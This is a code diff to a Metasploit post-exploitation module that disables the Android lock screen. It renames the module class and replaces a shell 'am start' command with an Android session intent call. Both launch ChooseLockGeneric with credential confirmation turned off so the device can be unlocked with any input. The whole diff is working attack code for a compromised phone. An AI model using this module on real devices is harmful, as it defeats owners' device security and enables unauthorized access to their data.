@@ -5,7 +5,7 @@
 
 require 'msf/core'
 
-class Metasploit4 < Msf::Post
+class MetasploitModule < Msf::Post
   Rank = NormalRanking
 
   include Msf::Post::Common
@@ -63,13 +63,12 @@ class Metasploit4 < Msf::Post
       return
     end
 
-    output = cmd_exec('am start -n com.android.settings/com.android.settings.ChooseLockGeneric --ez confirm_credentials false --ei lockscreen.password_type 0 --activity-clear-task')
-    if output =~ /Error:/
-      print_error("The Intent could not be started")
-      vprint_status("Command output: #{output}")
-    else
+    result = session.android.activity_start('intent:#Intent;launchFlags=0x8000;component=com.android.settings/.ChooseLockGeneric;i.lockscreen.password_type=0;B.confirm_credentials=false;end')
+    if result.nil?
       print_good("Intent started, the lock screen should now be a dud.")
       print_good("Go ahead and manually swipe or provide any pin/password/pattern to continue.")
+    else
+      print_error("The Intent could not be started: #{result}")
     end
   end
 
